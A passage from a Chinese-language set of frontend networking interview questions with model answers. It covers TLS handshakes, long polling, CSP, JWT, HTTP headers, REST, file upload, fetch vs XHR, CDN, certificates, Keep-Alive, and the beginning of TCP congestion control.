  |      版本、随机数、加密套件、SNI     |
  | <--- ServerHello ------------------ |
  | <--- Certificate ------------------ |
  | <--- ServerKeyExchange ------------ |  ECDHE 等场景
  | <--- ServerHelloDone -------------- |
  | ---- ClientKeyExchange -----------> |
  | ---- ChangeCipherSpec ------------> |
  | ---- Finished --------------------> |
  | <--- ChangeCipherSpec ------------- |
  | <--- Finished --------------------- |
  | ===== 加密 HTTP 数据 ============== |
```

TLS 1.2 典型完整握手需要额外往返，历史上还存在 RSA key exchange 等模式；现代配置应优先 ECDHE，获得前向保密。

### TLS 1.3 简化流程
```txt
Client                                  Server
  | ---- ClientHello + key_share -----> |
  | <--- ServerHello + key_share ------ |
  | <--- EncryptedExtensions ---------- |
  | <--- Certificate ------------------ |
  | <--- CertificateVerify ------------ |
  | <--- Finished --------------------- |
  | ---- Finished --------------------> |
  | ===== 加密 HTTP 数据 ============== |
```

TLS 1.3 移除了不安全和过时算法，完整握手通常 1-RTT，并把更多握手内容加密。会话恢复可以更快；0-RTT 可以发送早期数据，但有重放风险，只适合幂等请求。

### ECDHE 密钥协商
```txt
1. 客户端和服务端各自生成临时椭圆曲线密钥对
2. 双方交换临时公钥
3. 双方用自己的私钥和对方公钥计算相同共享秘密
4. 通过 KDF 派生出握手密钥和应用数据密钥
```

临时密钥带来前向保密：即使服务器长期私钥未来泄露，过去抓包也不能直接解密。

### 证书验证
浏览器不会简单“向 CA 问一下”。常见验证包括：
1. 构建服务器证书到受信任根证书的证书链。
2. 验证每一级证书签名。
3. 检查域名 SAN 是否匹配。
4. 检查有效期、Key Usage、Basic Constraints 等扩展。
5. 根据 OCSP、CRL、OCSP Stapling 等机制处理吊销状态。

### 证书的作用
证书主要用于身份认证和签名验证；真正传输大量数据用握手协商出来的对称密钥。HTTPS 的性能优化也主要围绕 TLS 1.3、会话恢复、OCSP Stapling、HTTP/2/3 和证书链大小优化展开。

<!-- id: net-016; difficulty: 2; tags: 长轮询, 轮询, WebSocket, 实时通信; source: 高频 -->
# 什么是长轮询（Long Polling）？与普通轮询和 WebSocket 有何区别？

## 长轮询（Long Polling）

### 普通轮询
客户端固定间隔请求服务器。

```js
setInterval(async () => {
  const res = await fetch('/api/messages');
  const data = await res.json();
  updateMessages(data);
}, 1000);
```

缺点是实时性和间隔绑定；没有新数据时也会不断请求，浪费连接和带宽。

### 长轮询
客户端发起请求后，服务端如果没有新数据就暂时挂起，直到有数据或超时才返回。客户端收到响应后立即发起下一轮。

```js
let stopped = false;

async function longPoll(delay = 0) {
  if (stopped) return;

  if (delay > 0) {
    await new Promise((resolve) => setTimeout(resolve, delay));
  }

  try {
    const res = await fetch('/api/messages/poll', {
      signal: AbortSignal.timeout(30000),
    });
    const data = await res.json();
    handleMessages(data.messages);
    longPoll(0);
  } catch (error) {
    longPoll(1000); // 错误时退避，避免打爆服务端
  }
}

longPoll();
```

服务端要在返回、超时、客户端断开时清理挂起请求。

```js
const clients = new Map();

app.get('/api/messages/poll', (req, res) => {
  const clientId = String(req.query.clientId);

  const cleanup = () => {
    clearTimeout(timer);
    clients.delete(clientId);
  };

  const timer = setTimeout(() => {
    cleanup();
    res.json({ messages: [] });
  }, 25000);

  req.on('close', cleanup);
  clients.set(clientId, { res, cleanup });
});

function push(clientId, message) {
  const client = clients.get(clientId);
  if (!client) return;

  client.cleanup();
  client.res.json({ messages: [message] });
}
```

### 对比
| 维度 | 短轮询 | 长轮询 | WebSocket |
| --- | --- | --- | --- |
| 实时性 | 取决于轮询间隔 | 较好 | 最好 |
| 空请求 | 多 | 少 | 无请求-响应轮询 |
| 服务端资源 | 请求频繁 | 挂起连接较多 | 长连接管理 |
| 兼容性 | 最好 | 好，普通 HTTP | 代理需支持 Upgrade |
| 方向 | 客户端拉取 | 服务器延迟响应 | 双向主动发送 |

长轮询适合中低频实时、网络环境受限或无法使用 WebSocket 的场景；高频双向通信优先 WebSocket，单向服务端推送可考虑 SSE。

<!-- id: net-017; difficulty: 2; tags: CSP, 安全, XSS防御, HTTP头; source: 高频 -->
# Content Security Policy（CSP）是什么？如何配置？

## Content Security Policy（CSP）

### 概念
CSP 是浏览器安全策略，用来限制脚本、样式、图片、连接、iframe 等资源来源，降低 XSS 和数据注入攻击的执行能力。CSP 是纵深防御，不替代输出编码和输入校验。

### 配置方式
推荐使用 HTTP 响应头。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; object-src 'none'; base-uri 'self'
```

也可以用 meta 标签，但能力较弱，不适合完整策略。

```html
<meta http-equiv='Content-Security-Policy' content="default-src 'self'">
```

### 常用指令
```txt
default-src      默认资源来源
script-src       脚本来源
style-src        样式来源
img-src          图片来源
font-src         字体来源
connect-src      fetch/XHR/WebSocket/EventSource 目标
frame-src        页面能嵌入哪些 iframe
frame-ancestors  哪些页面能嵌入当前页面
object-src       plugin/object/embed，通常设为 'none'
base-uri         限制 <base>
form-action      限制表单提交目标
upgrade-insecure-requests 自动升级 http 子资源
```

### 来源值
```txt
'self'          同源
'none'          不允许任何来源
'nonce-...'     允许带匹配 nonce 的内联脚本/样式
'sha256-...'    允许匹配哈希的内联脚本/样式
'unsafe-inline' 允许内联，脚本中应尽量避免
'unsafe-eval'   允许 eval/new Function，尽量避免
https:          允许任意 HTTPS 来源
https://cdn.example.com 指定来源
```

### 推荐示例
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{SERVER_NONCE}' https://cdn.example.com;
  style-src 'self' 'nonce-{SERVER_NONCE}' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none'
```

nonce 应每个响应随机生成，不能写死。能用 nonce/hash 就不要用 `unsafe-inline`。

### Report-Only
```http
Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint
```

Report-Only 只上报不拦截，适合灰度迁移。旧系统也可能用 `report-uri`，新策略更推荐 `report-to`，但兼容上常会两者并存。

### 实践步骤
1. 先用 Report-Only 收集违规。
2. 清理内联脚本、eval、第三方域名。
3. 引入 nonce/hash。
4. 上线阻断策略并持续监控违规报告。

<!-- id: net-018; difficulty: 2; tags: TCP, UDP, 网络协议, 传输层; source: 高频 -->
# TCP 和 UDP 的区别？各自适用什么场景？

## TCP vs UDP

### TCP（Transmission Control Protocol）
**特点：面向连接、可靠传输、有序、流量控制**

```
可靠性机制：
1. 三次握手建立连接
2. 序列号+确认号（ACK）确保数据有序到达
3. 超时重传（未收到 ACK 则重发）
4. 流量控制（滑动窗口，防止接收方缓冲区溢出）
5. 拥塞控制（慢启动、拥塞避免、快重传、快恢复）
6. 四次挥手断开连接
```

### UDP（User Datagram Protocol）
**特点：无连接、不可靠、无序、速度快**

```
特点：
1. 不需要建立连接，直接发送
2. 无确认机制，不保证到达
3. 无序（包可能乱序到达）
4. 无流量控制
5. 头部只有 8 字节（TCP 最小 20 字节）
```

### 对比
| | TCP | UDP |
|--|-----|-----|
| 连接 | 面向连接 | 无连接 |
| 可靠性 | 可靠 | 不可靠 |
| 顺序 | 有序 | 无序 |
| 速度 | 较慢 | 快 |
| 开销 | 大 | 小 |

### 适用场景

**TCP 适用**
```
- HTTP/HTTPS（网页浏览）
- SMTP/POP3（邮件）
- FTP（文件传输）
- SSH（远程登录）

→ 需要数据完整性的场景
```

**UDP 适用**
```
- DNS（简单查询，应用层可重试）
- 视频直播/视频通话（丢帧可接受，延迟不可接受）
- 在线游戏（低延迟优先）
- HTTP/3（QUIC 基于 UDP，自行实现可靠性）

→ 对延迟敏感、可以容忍少量丢包的场景
```

<!-- id: net-019; difficulty: 2; tags: JWT, Token, 认证, 安全; source: 高频 -->
# 什么是 JWT？它的工作原理和安全注意事项？

## JWT（JSON Web Token）

### 结构
JWT 通常由三段 Base64URL 字符串组成：`Header.Payload.Signature`。

```txt
xxxxx.yyyyy.zzzzz
```

Header 描述类型和签名算法，Payload 放声明，Signature 用来防篡改。

```json
{ "alg": "HS256", "typ": "JWT" }
```

```json
{
  "sub": "user-123",
  "role": "admin",
  "iat": 1700800000,
  "exp": 1700886400,
  "iss": "https://auth.example.com",
  "aud": "api.example.com"
}
```

Payload 只是编码，不是加密，任何拿到 token 的人都能解码查看，不能放密码、身份证、密钥等敏感信息。

### 工作流程
```txt
1. 用户登录
2. 服务端验证凭证，签发 access token
3. 客户端保存 token
4. 请求时携带 Authorization: Bearer <token>
5. 服务端验证签名、过期时间、issuer、audience 等声明
6. 验证通过后识别用户和权限
```

### 生成和验证
```js
import jwt from 'jsonwebtoken';

const token = jwt.sign(
  { sub: user.id, role: user.role },
  process.env.JWT_SECRET,
  {
    algorithm: 'HS256',
    expiresIn: '15m',
    issuer: 'https://auth.example.com',
    audience: 'api.example.com',
  },
);

const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'https://auth.example.com',
  audience: 'api.example.com',
});
```

验证时必须限制允许的算法，避免算法混淆；不要接受 `none`。HS256 和 RS256 没有绝对谁更安全，关键是场景：HS256 是共享密钥，适合单服务或可信边界内；RS256/ES256 是非对称，适合认证中心签发、多服务只持有公钥验证。

### 安全注意事项
1. 全站 HTTPS，避免 token 被窃听。
2. access token 短有效期，refresh token 更长但要可轮换、可吊销。
3. 服务端校验 `exp`、`nbf`、`iat`、`iss`、`aud`，允许少量 clock skew。
4. 使用 `kid` 做密钥轮换时，要防止任意文件读取、任意 URL 取公钥等实现漏洞。
5. 存 localStorage 容易被 XSS 读取；存 HttpOnly Cookie 可降低 XSS 窃取，但要防 CSRF。
6. 需要主动失效时，使用黑名单、token version、短期 access token + refresh token 轮换。
7. 权限不要只信旧 token 里的 role，关键操作可实时查权限版本或服务端状态。

### 面试总结
JWT 是一种自包含、可签名的声明载体。签名保证防篡改，不保证保密；无状态校验提升扩展性，但吊销、续期和泄露处置要额外设计。

<!-- id: net-020; difficulty: 2; tags: HTTP, 请求头, 响应头, 安全头; source: 高频 -->
# HTTP 请求头和响应头有哪些常见字段？

## 常见 HTTP 请求头和响应头

### 通用/表示相关头
```txt
Cache-Control        缓存策略
Date                 报文生成时间
Content-Type         实体媒体类型和 charset
Content-Length       实体长度
Content-Encoding     实体压缩方式，如 gzip、br
ETag                 资源版本标识
Last-Modified        资源最后修改时间
```

`Connection`、`Transfer-Encoding` 等属于 hop-by-hop 头，在 HTTP/2/HTTP/3 中语义不同或被禁止，不能简单当作所有版本通用头。

### 常见请求头
```txt
Host                 目标主机，HTTP/1.1 必需
Accept               客户端期望响应类型
Accept-Encoding      支持的压缩算法
Accept-Language      期望语言
Authorization        认证信息，如 Bearer token
Cookie               携带 Cookie
Origin               请求来源，CORS/CSRF 常用
Referer              来源页面 URL，历史拼写就是 Referer
User-Agent           客户端标识
If-None-Match        携带 ETag 做协商缓存
If-Modified-Since    携带修改时间做协商缓存
Range                范围请求，如断点续传
```

`X-Requested-With` 是历史上部分框架用来标记 AJAX 的非标准头，现代接口不应强依赖它。

### 常见响应头
```txt
Location                      重定向目标
Set-Cookie                    设置 Cookie
Access-Control-Allow-Origin   CORS 允许来源
Access-Control-Allow-Credentials 是否允许凭证
WWW-Authenticate              401 时说明认证方案
Retry-After                   429/503 时建议重试时间
Vary                          缓存按哪些请求头区分版本
```

### 安全响应头
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

`X-Frame-Options` 可防点击劫持，但现代更推荐用 CSP 的 `frame-ancestors`，兼容旧浏览器时可以两者并用。

```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

### 面试总结
请求头表达“客户端能接受什么、带了什么凭证、缓存验证条件是什么”；响应头表达“资源是什么、怎么缓存、是否允许跨域、如何安全加载”。不同 HTTP 版本对连接级头字段处理不同，要避免把 HTTP/1.1 的头机械套到 HTTP/2/3。

<!-- id: net-021; difficulty: 2; tags: RESTful, API设计, HTTP方法; source: 高频 -->
# 什么是 RESTful API？有哪些设计原则？

## RESTful API

RESTful API 是把业务对象建模为资源，并用 HTTP 的统一接口表达资源状态转移；它不是“URL 写成名词”这么简单。

### REST 约束
1. **客户端-服务器分离**：客户端关注交互，服务端关注资源和状态
2. **无状态**：每个请求都带齐认证、条件、参数等上下文，服务端不依赖上一次请求
3. **可缓存**：用 `Cache-Control`、`ETag` 等明确缓存和校验策略
4. **统一接口**：资源标识、表现层、方法语义、自描述消息保持一致
5. **分层系统**：客户端不需要知道中间是否有网关、缓存、负载均衡
6. **按需代码**：可选约束，Web API 面试中一般点到即可

### HTTP 方法语义
```
GET     /users      - 查询资源，安全且幂等
HEAD    /users      - 只取响应头，安全且幂等
POST    /users      - 创建或触发处理，不天然幂等
PUT     /users/:id  - 整体替换，幂等
PATCH   /users/:id  - 部分修改，不天然幂等，可通过业务设计做到幂等
DELETE  /users/:id  - 删除资源，目标状态幂等；重复删除可能返回 204 或 404
```

### URL 和查询设计
```
GET  /articles                     # 资源集合，名词复数
GET  /articles/1                   # 单个资源
GET  /articles/1/comments          # 子资源
GET  /articles?status=draft&sort=-createdAt&limit=20
POST /articles/1/publication       # 非 CRUD 动作可建模成子资源

避免：
GET  /getArticles                  # 方法名进 URL
POST /deleteArticle?id=1           # 方法语义错误
```

### 状态码使用
```
200 OK              查询或更新后返回资源
201 Created         创建成功，通常带 Location
202 Accepted        异步任务已接受，还没完成
204 No Content      成功但无响应体
400 Bad Request     请求格式或参数错误
401 Unauthorized    未认证或认证失效
403 Forbidden       已认证但无权限
404 Not Found       资源不存在
409 Conflict        状态冲突，例如版本冲突
422 Unprocessable   语义校验失败
429 Too Many Requests  触发限流，可配 Retry-After
```

### 工程实践
- 版本控制可放路径、媒体类型或网关路由中；公开 API 常见 `/api/v1/users`
- 分页小数据可用 `page/limit`，大数据或实时列表更适合 cursor
- 写操作重试要考虑幂等键，例如 `Idempotency-Key`
- 并发更新可用 `ETag` + `If-Match` 做乐观锁
- 错误响应保持稳定结构：`code`、`message`、`details`、`requestId`

<!-- id: net-022; difficulty: 2; tags: 文件上传, FormData, XMLHttpRequest, 拖拽上传; source: 高频 -->
# 前端如何实现文件上传？有哪些注意事项？

## 前端文件上传

### 基础上传（FormData）
```jsx
function FileUpload() {
  const handleUpload = async (e) => {
    const file = e.target.files?.[0];
    if (!file) return;

    validateFile(file);

    const formData = new FormData();
    formData.append('file', file);
    formData.append('userId', '123');

    const res = await fetch('/api/upload', {
      method: 'POST',
      body: formData,
      // 不要手动设置 Content-Type，浏览器会带上 multipart boundary
    });

    if (!res.ok) throw new Error(`Upload failed: ${res.status}`);
    return res.json();
  };

  return <input type="file" accept="image/*" onChange={handleUpload} />;
}
```

### 上传进度
```js
function uploadWithProgress(file, onProgress, signal) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);

    xhr.upload.addEventListener('progress', (e) => {
      if (!e.lengthComputable) return;
      onProgress(Math.round((e.loaded / e.total) * 100));
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve(JSON.parse(xhr.responseText));
      } else {
        reject(new Error(`Upload failed: ${xhr.status}`));
      }
    });
    xhr.addEventListener('error', () => reject(new Error('Network error')));
    xhr.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError')));
    signal?.addEventListener('abort', () => xhr.abort(), { once: true });

    xhr.open('POST', '/api/upload');
    xhr.send(formData);
  });
}
```

`fetch` 的响应流能力更好，但主流场景里上传进度仍通常用 `XMLHttpRequest.upload.onprogress`。

### 校验与安全
```js
const MAX_SIZE = 10 * 1024 * 1024; // 10MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];

function validateFile(file) {
  if (file.size === 0) throw new Error('空文件');
  if (file.size > MAX_SIZE) throw new Error('文件过大');
  if (!ALLOWED_TYPES.includes(file.type)) throw new Error('文件类型不支持');
}
```

- 前端校验只提升体验，不能代替服务端校验
- 服务端应校验大小、扩展名、MIME、文件头 magic number，并做权限和病毒扫描
- 不要信任用户提交的文件名，展示前要转义，存储时使用服务端生成的 key
- 跨域上传需要 CORS；带 Cookie 时服务端还要允许 credentials

### 大文件方案
- 分片上传：切片、并发数控制、失败重试、断点续传、合并校验
- 直传对象存储：后端签发短期上传凭证或预签名 URL，前端直接上传到存储服务
- 秒传/去重：客户端计算 hash，服务端判断是否已存在
- 可取消：用 `AbortController` 或 XHR `abort()` 取消上传

### 图片预览
```js
const url = URL.createObjectURL(file);
img.src = url;
img.onload = () => URL.revokeObjectURL(url);
```

`URL.createObjectURL` 通常比 `FileReader.readAsDataURL` 更省内存；用完要释放。

<!-- id: net-023; difficulty: 2; tags: Fetch, XMLHttpRequest, AJAX, 网络请求; source: 高频 -->
# Fetch API 和 XMLHttpRequest 的区别是什么？

## Fetch API vs XMLHttpRequest

### XHR
```js
function xhrRequest(url) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.timeout = 5000;
    xhr.setRequestHeader('Authorization', `Bearer ${token}`);

    // 跨站且需要 Cookie 时才设置；服务端也必须允许 credentials
    // xhr.withCredentials = true;

    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve(JSON.parse(xhr.responseText));
      } else {
        reject(new Error(`HTTP Error: ${xhr.status}`));
      }
    };
    xhr.onerror = () => reject(new Error('Network Error'));
    xhr.ontimeout = () => reject(new Error('Timeout'));

    xhr.send();
  });
}
```

### Fetch
```js
async function fetchRequest(url) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 5000);

  try {
    const res = await fetch(url, {
      method: 'GET',
      headers: { Authorization: `Bearer ${token}` },
      signal: controller.signal,
      credentials: 'same-origin', // 默认值；跨站带 Cookie 用 include
    });

    if (!res.ok) throw new Error(`HTTP Error: ${res.status}`);
    return res.json();
  } finally {
    clearTimeout(timer);
  }
}
```

### 主要区别
| | XHR | Fetch |
|--|-----|-------|
| 编程模型 | 事件回调 | Promise / async-await |
| HTTP 错误 | 不会自动当作异常 | 不会 reject，需要检查 `res.ok` |
| 网络错误 | `error/timeout/abort` 事件 | Promise reject |
| 取消请求 | `xhr.abort()` | `AbortController` |
| 上传进度 | 支持 `xhr.upload.onprogress` | 主流场景不直接支持 |
| 下载进度 | 支持 `onprogress` | 可用 `ReadableStream` 读取 |
| Cookie | 同源默认带；跨站需 `withCredentials` | 默认 `same-origin`；跨站需 `credentials: 'include'` |
| 响应流 | 能监听进度，但不是标准流接口 | `response.body` 是标准 ReadableStream |

### Fetch 常见坑
- 只有网络失败、CORS 拦截、取消等会 reject；404/500 仍会 resolve
- `response.json()` 只能读一次；需要复用时先 `response.clone()`
- 请求体和响应体是流，读过后 `bodyUsed` 会变成 `true`
- 跨站带 Cookie 还要求服务端返回具体 `Access-Control-Allow-Origin` 和 `Access-Control-Allow-Credentials: true`

<!-- id: net-024; difficulty: 2; tags: CDN, 缓存, 性能优化, 网络; source: 高频 -->
# 什么是 CDN？CDN 如何工作？

## CDN（Content Delivery Network）

CDN 是分布在多地域的边缘节点网络，用缓存、就近接入和链路优化把静态资源或可缓存内容更快地返回给用户。

### 工作原理
```
传统方式：用户 → 源站
CDN 方式：用户 → DNS/Anycast/调度系统 → 边缘节点
                                     ├── 缓存命中：直接返回
                                     └── 缓存未命中：回源 → 缓存 → 返回
```

“最近节点”不一定只按地理距离决定，还会受运营商、BGP 路由、负载、健康状态和 DNS 解析器位置影响。

### 核心机制
```
1. 接入调度
   CNAME 到 CDN 域名，CDN 通过 DNS、Anycast 或内部调度返回合适节点。

2. 缓存键
   通常由 Host + Path + Query + 部分请求头组成。
   Vary、Cookie、Authorization 配错会导致缓存命中率低或数据泄露。

3. 缓存控制
   Cache-Control: public, max-age=86400, s-maxage=31536000, immutable
   s-maxage 影响共享缓存；浏览器仍按 max-age 判断。

4. 回源与刷新
   未命中或过期后回源，可用 ETag/Last-Modified 再验证。
   发布错误时用 purge/invalidation 主动刷新。
```

### 前端最佳实践
```js
// vite.config.js
export default {
  base: 'https://cdn.example.com/static/',
  build: {
    rollupOptions: {
      output: {
        entryFileNames: 'assets/[name].[hash].js',
        chunkFileNames: 'assets/[name].[hash].js',
        assetFileNames: 'assets/[name].[hash][extname]',
      },
    },
  },
};
```

- 带 hash 的 JS/CSS/图片可设置长缓存和 `immutable`
- `index.html` 不应长缓存，避免引用旧资源清单
- 字体跨域加载需要正确的 CORS 响应头
- 图片处理、DDoS 防护、WAF、Origin Shield 是 CDN 厂商能力，不是所有 CDN 自动具备
- 监控命中率、回源流量、5xx、首字节时间和各地区延迟

<!-- id: net-025; difficulty: 2; tags: 网络, 浏览器渲染, DNS, TCP, 综合; source: 高频 -->
# 浏览器输入 URL 到页面显示，整个过程发生了什么？

## 从 URL 输入到页面显示

### 1. URL 解析与导航决策
```
https://www.example.com:443/path?query=1#hash
协议  域名              端口 路径  查询    片段
```

浏览器会判断这是搜索词还是 URL，补全默认协议，检查 HSTS 规则，并决定是否可以使用前进后退缓存（bfcache）或需要发起新导航。

### 2. 缓存与 Service Worker
```
Memory/Disk HTTP Cache → Service Worker fetch 事件 → 网络请求
```

如果强缓存命中可直接使用；如果需要再验证，会带 `If-None-Match` 或 `If-Modified-Since`，服务器可返回 `304 Not Modified`。

### 3. DNS 解析
```
浏览器/系统缓存 → hosts → 递归解析器 → 权威 DNS → IP
```

根、TLD、权威 DNS 的迭代查询通常由递归解析器完成。现代浏览器还可能使用 DoH、DNS 预解析或连接复用减少这一步开销。

### 4. 建立连接
- 已有可复用连接时，HTTP/2 多路复用或 HTTP/3 连接迁移可能直接复用
- HTTP/1.1/2 over TLS 通常经历 TCP 三次握手 + TLS 握手
- HTTP/3 基于 QUIC/UDP，TLS 1.3 集成在 QUIC 握手中
- TLS 会校验证书、协商 ALPN，并通过 SNI 告诉服务器目标域名

### 5. 发送请求并接收响应
```
GET /path?query=1 HTTP/2
Host: www.example.com
Accept: text/html
Cookie: session=abc

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Content-Encoding: br
```

过程中可能发生重定向、认证、CORS/混合内容拦截、压缩解码和缓存写入。

### 6. 解析和渲染
```
HTML 字节流 → DOM
CSS → CSSOM
DOM + CSSOM → Render Tree
Layout → Paint → Composite → 屏幕显示
```

HTML 解析器会边下载边解析，预加载扫描器会提前发现 CSS、JS、图片等子资源。CSS 会阻塞渲染；普通同步脚本会阻塞 HTML 解析，并且通常要等待已发现的阻塞样式表。`defer` 脚本在 DOM 解析完成后按顺序执行，`async` 脚本下载完成后尽快执行。

### 7. 关键事件
```
DOMContentLoaded：DOM 解析完成，defer/module 脚本已执行
load：页面依赖的图片、样式等资源也加载完成
```

### 优化入口
- 减少重定向、DNS、握手和 TTFB
- 对关键第三方域名使用 `preconnect`，少量使用 `dns-prefetch`
- 静态资源走 CDN、压缩、长缓存和文件名 hash
- 用 `preload` 提前加载关键 CSS、字体或首屏图片
- 控制同步脚本、关键 CSS 体积和首屏图片大小

<!-- id: net-026; difficulty: 2; tags: OSI, TCP/IP, 网络模型, 协议; source: 高频 -->
# 什么是 OSI 七层模型和 TCP/IP 四层模型？

## 网络模型

网络分层模型用于解释职责边界，不是所有真实协议都能严格塞进某一层，面试时要讲清“模型”和“实现”的差异。

### OSI 七层模型
```
7. 应用层（Application）     HTTP、DNS、SMTP、WebSocket
6. 表示层（Presentation）    编码、压缩、加密表示
5. 会话层（Session）         会话建立、管理、恢复
4. 传输层（Transport）       TCP、UDP、端到端端口通信
3. 网络层（Network）         IP、ICMP、路由选择
2. 数据链路层（Data Link）   以太网、Wi-Fi、MAC、ARP
1. 物理层（Physical）        电信号、光信号、无线电、网线
```

TLS 常被教学性地放在表示层，但在 Web 实现里更准确地说是位于应用协议和传输层之间：`HTTP -> TLS -> TCP`，HTTP/3 则是 `HTTP/3 -> QUIC/TLS 1.3 -> UDP`。

### TCP/IP 四层模型
```
4. 应用层      HTTP、DNS、TLS、WebSocket、SSH、SMTP
3. 传输层      TCP、UDP、QUIC（通常在 UDP 之上实现传输能力）
2. 网际层      IP、ICMP、路由
1. 网络接口层  Ethernet、Wi-Fi、ARP、MAC、物理介质
```

### 封装与解封装
```
发送方：应用数据 → TCP/UDP 头 → IP 头 → 链路层帧头/尾 → 比特流
接收方：比特流 → 链路层帧 → IP 包 → TCP/UDP 段 → 应用数据
```

每一层只处理本层职责：传输层关心端口、可靠性和拥塞控制；网络层关心 IP 和路由；链路层关心同一链路上的帧传输。

### 常见协议对应
```
应用层：HTTP(80) HTTPS(443) DNS(53) SSH(22)
传输层：TCP UDP QUIC
网际层：IPv4 IPv6 ICMP
链路层：Ethernet Wi-Fi ARP
```

### 记忆口诀
```
OSI：物数网传会表应
TCP/IP：接口、网际、传输、应用
```

<!-- id: net-027; difficulty: 2; tags: HTTPS, 证书, CA, TLS, 安全; source: 高频 -->
# 什么是 HTTPS 证书？如何验证证书有效性？

## HTTPS 证书

HTTPS 证书通常指公开信任的 X.509 服务器证书，用来证明“这个公钥属于这个域名”，从而让 TLS 握手可以安全协商会话密钥。

### 证书包含什么
```
- Subject / Subject Alternative Name：域名或 IP，现代浏览器主要看 SAN
- Public Key：服务器公钥
- Issuer：签发 CA
- Validity：notBefore / notAfter
- Key Usage / Extended Key Usage：用途限制，例如 serverAuth
- Signature Algorithm：签名算法
- CA Signature：签发者对证书内容的签名
```

### 信任链
```
Root CA（系统/浏览器信任库内置）
  ↓ 签发并约束
Intermediate CA
  ↓ 签发
Leaf / End-Entity Certificate（站点证书）
```

服务端通常发送叶子证书和中间证书；客户端用本地信任库里的根证书构建并验证链路。根证书一般不会由服务端发送。

### 浏览器验证什么
1. 证书链能否连接到受信任根，并且每级签名正确
2. 当前时间是否在有效期内
3. 域名是否匹配 SAN，通配符只匹配一层，例如 `*.example.com` 不匹配 `a.b.example.com`
4. 证书用途是否允许 TLS server authentication
5. 签名算法、密钥长度、CA 约束是否满足浏览器策略
6. 证书是否被吊销：OCSP、CRL、OCSP Stapling、CRLite 等，实际浏览器策略可能软失败
7. 公开证书还会受 Certificate Transparency 等生态策略约束

### 证书类型
```
DV：验证域名控制权，自动化程度高，例如 Let's Encrypt
OV：验证域名控制权 + 组织身份，证书里有组织信息
EV：更严格的组织验证，但现代主流浏览器一般不再在地址栏突出显示公司名
```

DV/OV/EV 的加密强度没有本质差异，差别在身份审核信息；用户最终仍要关注域名和浏览器安全提示。

### 吊销机制
- CRL：下载吊销列表，列表可能大且不够实时
- OCSP：在线查询单张证书状态，可能带来延迟和隐私问题
- OCSP Stapling：服务器把 CA 签名过的 OCSP 响应随握手发送，减少客户端查询

### 运维注意
- 自动续期，避免证书过期事故
- 部署完整中间证书链
- 私钥泄露后立刻吊销并轮换
- 配合 HSTS、防止用户被降级到 HTTP

<!-- id: net-028; difficulty: 2; tags: HTTP, Keep-Alive, 持久连接, 性能; source: 高频 -->
# 什么是 HTTP 的 Keep-Alive？

## HTTP Keep-Alive（持久连接）

Keep-Alive 指复用已经建立的连接，减少 TCP 握手、TLS 握手、慢启动和端口资源开销。

### HTTP/1.x 中的行为
HTTP/1.0 默认短连接，想复用通常要显式声明 `Connection: keep-alive`。HTTP/1.1 默认持久连接，除非发送 `Connection: close`。

```
短连接：
[TCP/TLS] → 请求1 → 响应1 → 断开
[TCP/TLS] → 请求2 → 响应2 → 断开

持久连接：
[TCP/TLS] → 请求1 → 响应1 → 请求2 → 响应2 → ... → 空闲超时/主动关闭
```

### 相关头部
```
Connection: keep-alive   # HTTP/1.0 常见；HTTP/1.1 通常不必显式写
Keep-Alive: timeout=5, max=100
Connection: close        # 告诉对端本次响应后关闭连接
```

`Connection` 和 `Keep-Alive` 是逐跳头部，只对当前连接有效；HTTP/2 和 HTTP/3 禁止使用这类 HTTP/1.x 连接管理头。

### 与 pipelining / multiplexing 的区别
- **Keep-Alive**：复用连接，但 HTTP/1.1 常规使用仍是一问一答
- **HTTP/1.1 pipelining**：可连续发多个请求，但响应必须按请求顺序返回，容易队头阻塞，浏览器中很少启用
- **HTTP/2 multiplexing**：同一 TCP 连接上多个 stream 并发，解决 HTTP 层队头阻塞，但 TCP 丢包仍会影响整个连接
- **HTTP/3/QUIC**：基于 UDP 的多路复用，减少传输层队头阻塞影响

### Node.js 客户端示例
```js
import https from 'node:https';

const agent = new https.Agent({
  keepAlive: true,
  maxSockets: 50,
  maxFreeSockets: 10,
  timeout: 30_000,
});

https.get('https://api.example.com/data', { agent }, (res) => {
  res.resume();
});
```

Node 18+ 全局 `fetch` 基于 Undici，连接池配置应使用 Undici 的 dispatcher/Agent，而不是传统 `http.Agent`。

### 服务端配置关注点
```nginx
keepalive_timeout 65s;
keepalive_requests 1000;

upstream backend {
  server 127.0.0.1:3000;
  keepalive 32;
}
```

超时时间过短会降低复用率，过长会占用连接资源；要结合并发、负载均衡器和上游服务能力调优。

<!-- id: net-029; difficulty: 3; tags: TCP, 拥塞控制, 慢启动, 网络协议; source: 高频 -->
# 详细讲解 TCP 的拥塞控制算法

## TCP 拥塞控制

拥塞控制解决“不要把网络打爆”的问题。发送方维护拥塞窗口 `cwnd`，接收方维护接收窗口 `rwnd`，实际可发送窗口通常受 `min(cwnd, rwnd)` 限制。

### 核心变量
```
cwnd      拥塞窗口，发送方根据网络状况动态调整
ssthresh  慢启动阈值，决定慢启动和拥塞避免的切换点
MSS       最大报文段大小
RTT       往返时延
```

### 1. 慢启动（Slow Start）
```
